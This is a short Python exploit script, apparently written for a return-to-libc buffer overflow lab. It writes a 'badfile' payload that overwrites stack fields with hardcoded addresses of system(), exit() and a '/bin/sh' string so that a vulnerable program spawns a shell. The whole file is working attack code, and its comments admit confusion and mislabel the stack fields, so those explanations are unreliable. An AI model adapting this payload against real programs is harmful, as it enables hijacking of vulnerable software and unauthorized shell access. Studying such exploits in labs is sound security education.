#!/usr/bin/python3
import sys


def tobytes(value):
    return (value).to_bytes(4, byteorder="little")


def main():
    # Fill content with non-zero values
    content = bytearray(0xaa for i in range(300))

    # Why 4 bytes has to be added to this offset, I do not know...
    # The offset value will change
    """
    The offset represents the distance between the end of the buffer
    and the stack frame pointer (ebp). It is necessary to add 4 bytes
    to the offset when determining the location for the various addresses.
    I am not exactly sure why this is the case.
    """
    offset = 80 + 4

    # This goes in the first argument field: ebp + 8
    X = offset + 8
    sh_addr = 0xbffffdef       # The address of "/bin/sh"
    content[X:X+4] = tobytes(sh_addr)

    # This goes in the Old ebp field: offset
    Y = offset
    system_addr = 0xb7e42da0   # The address of system()
    content[Y:Y+4] = tobytes(system_addr)

    # Thi sgoes in the return address field: ebp + 4
    Z = offset + 4
    exit_addr = 0xb7e369d0     # The address of exit()
    content[Z:Z+4] = tobytes(exit_addr)

    # Save content to a file
    with open("badfile", "wb") as f:
      f.write(content)


if __name__ == "__main__":
    main()
